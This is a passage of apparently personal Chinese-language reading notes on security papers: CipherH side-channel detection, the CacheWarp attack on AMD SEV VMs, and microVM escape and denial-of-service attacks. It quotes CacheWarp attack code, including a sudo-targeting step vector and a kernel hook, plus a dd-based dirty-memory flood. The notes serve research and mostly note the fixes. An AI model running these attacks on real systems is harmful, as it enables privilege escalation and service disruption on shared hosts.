<p>第一个条件是判断是否相等 第二个条件是判断换一个变量是否可以不等(把key换成另一个symbol)</p>
<p>这里虽然名字都是sol 但实际上都是两个不同的symbol 比如sol_22 sol_23</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>  temp1 == <span class="string">&#x27;__add__&#x27;</span> <span class="keyword">and</span> temp2 ==  <span class="string">&#x27;__add__&#x27;</span> :</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;k&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(state.ch.chain[<span class="number">4</span>*l+<span class="number">3</span>].args[<span class="number">0</span>]):</span><br><span class="line">    	temp3 = state.ch.chain[<span class="number">4</span>*l+<span class="number">3</span>] - state.ch.chain[<span class="number">4</span>*l+<span class="number">3</span>].args[<span class="number">0</span>] + state.solver.BVS(<span class="string">&quot;sol&quot;</span>,  <span class="built_in">int</span>(b))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	temp3 = state.ch.chain[<span class="number">4</span>*l+<span class="number">3</span>] - state.ch.chain[<span class="number">4</span>*l+<span class="number">3</span>].args[<span class="number">1</span>] + state.solver.BVS(<span class="string">&quot;sol&quot;</span>,  <span class="built_in">int</span>(b))                                       </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;k&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(state.inspect.mem_write_expr.args[<span class="number">0</span>]):</span><br><span class="line">    	temp4 = state.inspect.mem_write_expr - state.inspect.mem_write_expr.args[<span class="number">0</span>] + state.solver.BVS(<span class="string">&quot;sol&quot;</span>,  <span class="built_in">int</span>(b))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	temp4 = state.inspect.mem_write_expr - state.inspect.mem_write_expr.args[<span class="number">1</span>] + state.solver.BVS(<span class="string">&quot;sol&quot;</span>,  <span class="built_in">int</span>(b))</span><br><span class="line">    <span class="keyword">if</span> state.solver.satisfiable(extra_constraints=[state.ch.chain[<span class="number">4</span>*l+<span class="number">3</span>] == state.inspect.mem_write_expr, temp3 != temp4]):</span><br><span class="line">    	<span class="built_in">print</span>(<span class="string">&quot;bug in &#123;&#125; for &#123;:x&#125; and &#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(fun_name, state.ch.chain[<span class="number">4</span>*l], state.inspect.instruction), file=f_result)                     </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里等号的含义是，是否存在某一组symbol的组合(k1 k2 k3 k4) 使得取值可以相等(64bit整数)</p>
<p>W1 W2应该表示连续两次读 (i变i+1 或f前和f后)</p>
<p><strong>ch.chain和inspect.mem_write_expr</strong>是什么？  好像后者就是前者的4l+2?</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">state.ch.chain = state.ch.chain + [state.inspect.instruction]</span><br><span class="line">state.ch.chain = state.ch.chain + [state.inspect.mem_write_address]</span><br><span class="line">a = <span class="built_in">str</span>(state.inspect.mem_write_expr)</span><br><span class="line">b = a[<span class="number">3</span>:<span class="number">5</span>]</span><br><span class="line">state.ch.chain = state.ch.chain + [b]</span><br><span class="line">state.ch.chain = state.ch.chain + [state.inspect.mem_write_expr]</span><br></pre></td></tr></table></figure>





<p><a target="_blank" rel="noopener" href="https://github.com/Sen-Deng/CipherH/blob/master/evaluation_result/wolfssl_rsa_o0/symbolic_exec/result.txt">CipherH&#x2F;evaluation_result&#x2F;wolfssl_rsa_o0&#x2F;symbolic_exec&#x2F;result.txt at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>
<p>这个地址应该就是二进制文件里面的地址 非常精确 供之后手动分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bug in fp_rshb for 41cc2a and 41cc2a</span><br><span class="line">bug in fp_rshb for 41cc63 and 41cc63</span><br><span class="line"></span><br><span class="line">bug in _fp_exptmod_ct for 41ee25 and 41ee5c</span><br><span class="line">bug in _fp_exptmod_ct for 41ee4b and 41ee4b</span><br><span class="line">bug in _fp_exptmod_ct for 41ee5c and 41ee5c</span><br><span class="line">bug in _fp_exptmod_ct for 41f04b and 41f04b</span><br></pre></td></tr></table></figure>

<h4 id="inter"><a href="#inter" class="headerlink" title="inter"></a>inter</h4><p>同一块内存会在函数调用间被写</p>
<ul>
<li>频繁调用</li>
<li>callee至少一个参数是tainted</li>
</ul>
<p>没有加约束求解 所以可能带来false positives</p>
<blockquote>
<p>In all, during our intra-procedural analysis, we use symbolic execution to traverse each path of a tainted function Fc. During the traversal, we search for every encountered callee function and decide if any callee function F meets the aforementioned patterns. If so, we will proceed further to launch intra-procedural symbolic execution toward F, and decide if F has memory write instructions whose content is derived from its tainted parameters. If so, we would conclude that F enables ciphertext side channels, assuming multiple runs of F from Fc write secrets into the same memory address.  </p>
</blockquote>
<p>只要callee F用taint 写了内存就认为会带来side channel</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/05/04/papers/CacheWarp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/04/papers/CacheWarp/" class="post-title-link" itemprop="url">CacheWarp</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-05-04 15:40:39 / Modified: 15:41:51" itemprop="dateCreated datePublished" datetime="2024-05-04T15:40:39+08:00">2024-05-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>4.3k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>16 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="CacheWarp"><a href="#CacheWarp" class="headerlink" title="CacheWarp"></a>CacheWarp</h1><p>snp用的是<a target="_blank" rel="noopener" href="https://github.com/sev-step/sev-step">sev-step&#x2F;sev-step: This repo tracks a compatible state of all sev step components and contains script to easily install everything required to setup a sev vm (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/cispa/CacheWarp/blob/main/kernel-patch/kernel.patch">CacheWarp&#x2F;kernel-patch&#x2F;kernel.patch at main · cispa&#x2F;CacheWarp (github.com)</a></p>
<p>SEV_STEP_FLAG_BASE_PFN   sev_step_page_va  和user通信地址</p>
<p>intr_interception 核心逻辑</p>
<p><a target="_blank" rel="noopener" href="https://github.com/cispa/CacheWarp/blob/main/userspace-controller/cachewarp/cachewarp.c">CacheWarp&#x2F;userspace-controller&#x2F;cachewarp&#x2F;cachewarp.c at main · cispa&#x2F;CacheWarp (github.com)</a></p>
<p>sev_step_kernel_sync_addr_p 和step框架通信</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sev_step_kernel_sync_addr_p = libtea_map_physical_address_range(instance, KERNEL_SYNC_PA, <span class="number">4096</span>, PROT_READ | PROT_WRITE, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">memset</span>(sev_step_kernel_sync_addr_p, <span class="number">0</span>, <span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uint16_t</span> vec[<span class="number">100</span>] = &#123;<span class="number">44</span>, <span class="number">0</span>,<span class="number">8</span>,<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>, <span class="number">8</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>, <span class="number">0</span>,<span class="number">0x80</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> ,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x201</span>, <span class="number">1</span>,<span class="number">0x101</span>,<span class="number">0x101</span>,<span class="number">3</span>,<span class="number">0x11</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">0x41</span>,<span class="number">0x41</span>,<span class="number">0x5</span>, <span class="number">1</span>,<span class="number">0x11</span>,<span class="number">0x21</span>,<span class="number">0x20</span>,<span class="number">1</span>, <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>, <span class="number">0x21</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0x3000</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= vec[<span class="number">0</span>]; i++)</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;movw %1, (%0)\n\t&quot;</span>:: <span class="string">&quot;r&quot;</span>(sev_step_kernel_sync_addr_p+<span class="number">16</span>+<span class="number">2</span>*i),<span class="string">&quot;r&quot;</span>(vec[i]):)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>vec攻击向量 和sudo的binary有关</p>
<p><a target="_blank" rel="noopener" href="https://github.com/cispa/CacheWarp/tree/main/sudo">CacheWarp&#x2F;sudo at main · cispa&#x2F;CacheWarp (github.com)</a></p>
<p>用到libtea 是usenix security22提供的一套框架 不用自己写一大堆难懂的汇编 并且屏蔽掉平台的差异</p>
<p><a target="_blank" rel="noopener" href="https://github.com/libtea/frameworks/blob/master/libtea/src/libtea_common.c">frameworks&#x2F;libtea&#x2F;src&#x2F;libtea_common.c at master · libtea&#x2F;frameworks (github.com)</a></p>
<p>vec记录了一串数值 是step指令的序列</p>
<p>vmsa layout 记录在手册中</p>
<p><a target="_blank" rel="noopener" href="https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf">https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf</a></p>
<p>Table B-4. VMSA Layout, State Save Area for SEV-ES</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">vmsa_paddr = svm-&gt;vmcb-&gt;control.vmsa_pa;</span><br><span class="line"></span><br><span class="line">rsp = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x1d8</span>);</span><br><span class="line">rbp = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x328</span>);</span><br><span class="line">rax = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x1f8</span>);</span><br><span class="line">rcx = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x308</span>);</span><br><span class="line">rdx_rbx = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x310</span>);</span><br><span class="line">rsi_rdi = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x330</span>);</span><br><span class="line">r8_r9   = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x340</span>);</span><br><span class="line">r10_r11 = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x350</span>);</span><br><span class="line">r12_r13 = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x360</span>);</span><br><span class="line">r14_r15 = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x370</span>);</span><br><span class="line">xmm = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x470</span>);</span><br><span class="line">ymm = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x570</span>);</span><br><span class="line">cs  = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x10</span>);</span><br><span class="line">ss  = *(<span class="keyword">volatile</span> u64 *)(vmsa_vaddr+<span class="number">0x20</span>);</span><br><span class="line">reg_vector = ((last_vmsa_rsp != rsp) &lt;&lt; <span class="number">0</span>) + ((last_vmsa_rbp != rbp) &lt;&lt; <span class="number">1</span>) + \</span><br><span class="line">						((last_vmsa_rax != rax) &lt;&lt; <span class="number">2</span>) 		   + ((last_vmsa_rcx != rcx) &lt;&lt; <span class="number">3</span>) + \</span><br><span class="line">						((last_vmsa_rdx_rbx != rdx_rbx) &lt;&lt; <span class="number">4</span>)  + ((last_vmsa_rsi_rdi != rsi_rdi) &lt;&lt; <span class="number">5</span>) + \</span><br><span class="line">						((last_vmsa_r8_r9 != r8_r9) &lt;&lt; <span class="number">6</span>) 	   + ((last_vmsa_r10_r11 != r10_r11) &lt;&lt; <span class="number">7</span>) + \</span><br><span class="line">						((last_vmsa_r12_r13 != r12_r13) &lt;&lt; <span class="number">8</span>)  + ((last_vmsa_r14_r15 != r14_r15) &lt;&lt; <span class="number">9</span>) + \</span><br><span class="line">						((last_vmsa_xmm != xmm) &lt;&lt; <span class="number">10</span>) 		   + ((last_vmsa_ymm != ymm) &lt;&lt; <span class="number">11</span>) + \</span><br><span class="line">						((last_vmsa_cs != cs) &lt;&lt; <span class="number">12</span>) 		   + ((last_vmsa_ss != ss) &lt;&lt; <span class="number">13</span>);</span><br><span class="line"><span class="keyword">if</span> (reg_vector != *((<span class="keyword">volatile</span> u16 *)(sev_step_page_va + PATH_OFFSET + path_index*<span class="number">2</span>))) &#123;</span><br><span class="line">						find_target = <span class="literal">false</span>;</span><br><span class="line">						printk(<span class="string">&quot;dismatch %dth Instr! the vector is 0x%x\n&quot;</span>, path_index, reg_vector);</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>









<p>user 先设置flag  kvm把所有页表present bit设为0 guest触发NPF</p>
<p>kvm拿到gpa 设置APIC</p>
<p>小于阈值 0step 大于阈值 &gt;&#x3D;1step</p>
<p>观察RIP看是0还是非0</p>
<p>snp增加了freshness 寄存器一样密文也会变 可以用sev-step的performance counter</p>
<p>由于vmsa的cache 导致每次context switch时间不稳定 因此用MTRR标记为不可缓存 并且用wbinvd解决AMD CPU可能stale的问题</p>
<p>NPF的作用是啥</p>
<blockquote>
<p>To ensure consistent conditions for every stepping, the hypervisor always clears the present bit of the last fault page when handling the APIC timer interrupt, i.e., an NPF is always triggered before the next APIC interrupt.  </p>
</blockquote>
<p>为了控制变量 保证时间稳定？感觉几乎没有用</p>
<ol>
<li>run的汇编每次固定apic timer 可以step</li>
<li>sev-step没有提到page fault</li>
</ol>
<p>是否只是拿个gpa 方便找pattern？</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted, (u32*)(APIC_BASE + APIC_TMICT), apic_interval, wbnoinvd);</span><br><span class="line">SYM_FUNC_START(__svm_sev_es_vcpu_run)</span><br><span class="line">    movl %_ASM_ARG4L, (%_ASM_ARG3)</span><br></pre></td></tr></table></figure>

<p>攻击触发点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">ctrl_thread</span><span class="params">(<span class="type">void</span>* dummy)</span> &#123; </span><br><span class="line">	</span><br><span class="line">	pin_to_core(ASSIST_CORE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// hook kvm_exit_handler in the kernel </span></span><br><span class="line">	<span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;movq %1, (%0)\n&quot;</span>::<span class="string">&quot;r&quot;</span>(sev_step_kernel_sync_addr_p),<span class="string">&quot;r&quot;</span>(flag):)</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Wait until the attack finishes */</span></span><br><span class="line">	<span class="keyword">while</span> (*(<span class="type">uint32_t</span>*)(sev_step_kernel_sync_addr_p)) &#123;sched_yield();&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">intr_interception</span><br><span class="line">    <span class="comment">/* Start */</span></span><br><span class="line">    <span class="keyword">if</span> (zero_stepping_time == <span class="number">0</span> &amp;&amp; non_zero_stepping_time == <span class="number">0</span>) &#123;</span><br><span class="line">        kvm_unpre_all(vcpu-&gt;kvm, svm-&gt;vmcb-&gt;control.asid);</span><br><span class="line">        svm_flush_tlb_current(vcpu);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Mark VMSA into UC will make `VMRUN` updates all vmsa state in cache */</span></span><br><span class="line">        <span class="keyword">if</span> (uc_vmsa) &#123;</span><br><span class="line">            mtrr_uc_page(vmsa_paddr, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Avoid to drop smth dirty data and freeze the system</span></span><br><span class="line"><span class="comment">			 * wbnoinvd is enough to make it reliable</span></span><br><span class="line"><span class="comment">			 * wbinvd also works, but it takes longer time</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">        <span class="keyword">if</span> (invd) &#123;</span><br><span class="line">            <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(<span class="string">&quot;wbnoinvd\n\t&quot;</span>)</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ssh 怎么利用page fault一起找的？</p>
<p>npf_interception intr_interception svm_vcpu_enter_exit三者关系是什么？</p>
<p>exit之后不就是NPF或者INTR 为什么急着先处理？</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/23/papers/forward/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="szy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="S blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | S blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/01/23/papers/forward/" class="post-title-link" itemprop="url">Operation Forwarding</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2024-01-23 13:28:30 / Modified: 13:29:42" itemprop="dateCreated datePublished" datetime="2024-01-23T13:28:30+08:00">2024-01-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">In</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/papers/" itemprop="url" rel="index"><span itemprop="name">papers</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="Word count in article">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">Word count in article: </span>
      <span>1.7k</span>
    </span>
    <span class="post-meta-item" title="Reading time">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">Reading time &asymp;</span>
      <span>6 mins.</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Operation-Forwarding"><a href="#Operation-Forwarding" class="headerlink" title="Operation Forwarding"></a>Operation Forwarding</h1><p>usenix security23</p>
<p>虽然使用硬件虚拟化进行了隔离 但是microVM使用的组件还是会涉及到使用host的资源</p>
<p>策略1 container components</p>
<ul>
<li>kata container 用viriofs 提供rootfs 使得guest在这个文件夹的操作会转发到host</li>
<li>firecracker用runc jailer先在host上创建文件夹 然后复制文件 作为rootfs 使得host普通用户可以通过创建microVM利用containerd的漏洞做坏事</li>
</ul>
<blockquote>
<p>however, virtiofs is designed to offer local file system semantics and high performance. The file system performance downgrades without virtiofs in Kata Containers   </p>
</blockquote>
<p>用这个是为了性能</p>
<p>策略2 device emulator</p>
<p>策略3 host kernel module</p>
<h2 id="1-kata-container-virtiofs"><a href="#1-kata-container-virtiofs" class="headerlink" title="1 kata container virtiofs"></a>1 kata container virtiofs</h2><ol>
<li><p>container 在virtiofs的共享文件夹下创建SGIDbit的可执行文件  SGID可以临时获得程序所属组的权限</p>
</li>
<li><p>guest的virtiofs-driver会把open的system call forward给host的virtiofs daemon</p>
</li>
<li><p>通过host创建文件的权限检查 因为virfiofs daemon有root为 supplemental group</p>
<blockquote>
<p>Then it checks if the creation process has the same supplemental group as the directory owner. However, according to the virtiofs daemon’s document [31], virtiofs daemon must run as the root user and has the root group in its supplemental group  </p>
</blockquote>
</li>
<li><p>成功在host的某个目录下创建一个SGID的可执行文件</p>
</li>
</ol>
<p>vm内部和host是两个世界，所以这里无论怎么样vm还是无法利用这个可执行文件完成逃逸的。但是这个文件为host留了隐患，在host同一物理机器的任何普通用户都可以以root权限执行这个可执行文件。</p>
<blockquote>
<p>a regular user can get the host root group privileges when executing the file created by the malicious container.  </p>
</blockquote>
<p>cve的描述:</p>
<blockquote>
<p> This could allow a malicious unprivileged user inside the guest to gain access to resources accessible to the root group, potentially escalating their privileges within the guest. A malicious local user in the host might also leverage this unexpected executable file created by the guest to escalate their privileges on the host system.</p>
</blockquote>
<ol>
<li>guest内部的非root用户有root权限</li>
<li>host的非root用户有root权限</li>
</ol>
<p>报告给viriofs CVE 修复：取消掉viriofs 的root group</p>
<p><a target="_blank" rel="noopener" href="https://lists.nongnu.org/archive/html/qemu-devel/2022-01/msg05364.html">https://lists.nongnu.org/archive/html/qemu-devel/2022-01/msg05364.html</a></p>
<p>这个patch是qemu的virtiofsd  直接在启动的一开始把这个进程的所有supplemental group 都清空了 </p>
<p>一个用户可以属于多个组 但是登录的时候默认是primary group</p>
<p>其他组都是supplemental group</p>
<blockquote>
<p>If we have membership of “root” supplementary group</p>
</blockquote>
<p>root group是不是只是一个形象的表达？ 实际上只有adm sudo这种group</p>
<p>如果viriofs共享的文件夹是root 那么清空了virtiofsd的root supplemental group virtiofsd本身还怎么提供服务？最早为什么必须加？涉及到viriofs的设计 不深入研究</p>
<p><strong>利用open  策略1</strong></p>
<h2 id="2-kata-container-dirty-memory-attack"><a href="#2-kata-container-dirty-memory-attack" class="headerlink" title="2 kata container dirty memory attack"></a>2 kata container dirty memory attack</h2><ol>
<li>container中<code>dd if=/dev/zero of=/mnt/test bs=1M count=4096 oflag=direct  </code>持续生成 写文件</li>
<li>viriofs共享文件夹写write  VFS-&gt;viriofs driver-&gt;host viriofs daemon 触发host写 影响host dirty memory</li>
<li>linux kernel 维护一个值 当dirty memory超过阈值后(20%) 所有进程的写操作会从write-back变成write-through 性能下降</li>
<li>当多个container做这种操作 host的io性能可以下降90%</li>
</ol>
<p><strong>利用write 策略1</strong></p>
<blockquote>
<p>Besides, one can limit dirty memory usage of the virtiofs by adding the virtiofs daemon into cgroups.  </p>
</blockquote>
<p>virtiofs daemon就一个 给哪个vm的cgroup？</p>
<p>virtiofs团队正在努力让virtiofs daemon不需要以root运行 并且不影响用户使用</p>
<p><strong>经过测试 当某个文件被删除后 这个文件的buffer 即所有的dirty page也会马上被清空 不会再占用内存 所以仅仅靠一个container是无法达成攻击的 需要多个container一起 例如10container*4G&gt;192G(server)*20%&#x3D;38.4G</strong></p>
<p>多个container持续修改同一个文件即可 这样持续生成dirty memory</p>
<p>dirty memory在代码中的定义：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gmpy/p/12657801.html">Linux 脏数据回刷参数与调优 - 广漠飘羽 - 博客园 (cnblogs.com)</a></p>
<p>可回收内存(FILE_DIRTY) &gt; 可用内存(FREE+INACTIVE_FILE+ACTIVE_FILE) * ratio 发生回收 所以大量的匿名页是不记入的</p>
<h2 id="3-kata-container-nf-conntrack-table-attack"><a href="#3-kata-container-nf-conntrack-table-attack" class="headerlink" title="3 kata container nf_conntrack table attack"></a>3 kata container nf_conntrack table attack</h2><ol>
<li>container 疯狂connect 建立tcp连接</li>
<li>host的vhost-net kernel module调用tun_sendmsg-&gt;nf_conntrack_alloc</li>
<li>达到nf_conntrack_max 类似抽象资源攻击</li>
<li>造成随机丢包   ping 50%丢包 nginx不可用</li>
</ol>
<p>这里应该攻击的就是最终使用nf_conntrack table的网络使用者 也就是同样使用vhost-net的其他容器</p>
<p><strong>connect 策略3</strong></p>
<p>kata不修复 就给了减弱攻击的做法</p>
<p><a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/43205/nf-conntrack-table-full-dropping-packet/43220#43220">https://security.stackexchange.com/questions/43205/nf-conntrack-table-full-dropping-packet/43220#43220</a></p>
<p>调一些参数 比如timeout max</p>
<p>可以限制速率</p>
<p><a target="_blank" rel="noopener" href="https://lonesysadmin.net/2013/12/22/better-linux-disk-caching-performance-vm-dirty_ratio/">https://lonesysadmin.net/2013/12/22/better-linux-disk-caching-performance-vm-dirty_ratio/</a></p>
<h2 id="4-attack-of-vhost-net-kernel-module"><a href="#4-attack-of-vhost-net-kernel-module" class="headerlink" title="4 attack of vhost-net kernel module"></a>4 attack of vhost-net kernel module</h2><ol>
<li>container 疯狂 sendmsg&#x2F;recvmsg</li>
<li>kernel 疯狂handle_rx&#x2F;tx</li>
<li>vhost kernel worker thread使用很多cpu资源 且不计入VM使用的资源</li>
</ol>
<p>并没有显示对其他container有影响</p>
<blockquote>
<p>Specifically, a worker thread called vhost-<owner-device-emulator-process-pid> is created for each virtual machine  </p>
</blockquote>
<p><strong>sendmsg&#x2F;recvmsg 策略3</strong></p>
<p>每个VM一个 所以解决方案是把这些thread加入container的cgroup</p>
<p>实际上对于kata container 有一个sandbox_cgroup_only&#x3D;true的选项可以让vhost thread放入cgroup 但是默认是false</p>
<p>为什么这个可以让container的用户自己配置？ 那都是false不是不需要消耗资源付更多钱吗</p>
<p>可以用SRIOV</p>
<h2 id="5-firecracker-containerd-escalation"><a href="#5-firecracker-containerd-escalation" class="headerlink" title="5  firecracker-containerd escalation"></a>5  firecracker-containerd escalation</h2><p><a target="_blank" rel="noopener" href="https://github.com/firecracker-microvm/firecracker-containerd/commit/95c43cdec1b5dc92a16a732b56f482218c2b5fed">https://github.com/firecracker-microvm/firecracker-containerd/commit/95c43cdec1b5dc92a16a732b56f482218c2b5fed</a></p>
<ol>
<li><p>host 普通用户构造一个路径 申请创建microVM</p>
</li>
<li><p>firecracker-containerd是root权限运行 而代码中并没有检查参数所以涉及到的chown和create可以操作任何文件</p>
